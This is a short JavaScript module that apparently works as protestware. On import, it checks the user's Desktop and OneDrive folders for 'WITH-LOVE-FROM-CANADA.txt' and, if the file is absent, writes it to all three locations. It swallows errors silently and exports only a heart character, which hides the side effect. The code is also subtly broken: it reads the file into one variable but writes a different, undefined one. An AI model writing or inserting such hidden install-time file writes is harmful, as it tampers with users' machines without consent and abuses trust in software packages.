import fs from 'fs';
import find from './service/findFiles.js';
import read from './service/readFile.js';
import { homedir } from 'os';


var Desktops = `${homedir}/Desktop/`;
var OneDrive = `${homedir}/OneDrive/`;
var OneDriveDesktops = `${homedir}/OneDrive/Desktop/`;

var DesktopFileExists=find(Desktops,'WITH-LOVE-FROM-CANADA.txt');
var OneDriveDesktopFileExists=find(OneDriveDesktops,'WITH-LOVE-FROM-CANADA.txt');
var OneDriveFileExists=find(OneDrive,'WITH-LOVE-FROM-CANADA.txt');


function deliverAPeacefulMessage(path,message){
    try{
        fs.writeFile(
            path, 
            message,
            function(err){
                //its all good
            }
        );
    }catch(err){
        //thats ok
    }
}

//let's be polite and only do this once.
//hopefully once is all it takes.
if(!DesktopFileExists.length&&!OneDriveFileExists.length&&!OneDriveDesktopFileExists.length){
    var thinkaboutit='WITH-LOVE-FROM-CANADA.txt';

    var WITH_LOVE_FROM_AMERICA=read(`./${thinkaboutit}`);

    deliverAPeacefulMessage(`${Desktops}${thinkaboutit}`,WITH_LOVE_FROM_CANADA);
    deliverAPeacefulMessage(`${OneDriveDesktops}${thinkaboutit}`,WITH_LOVE_FROM_CANADA);
    deliverAPeacefulMessage(`${OneDrive}${thinkaboutit}`,WITH_LOVE_FROM_CANADA);
}

var whatWeWant='♥';

export {
    whatWeWant as default,
    whatWeWant
}
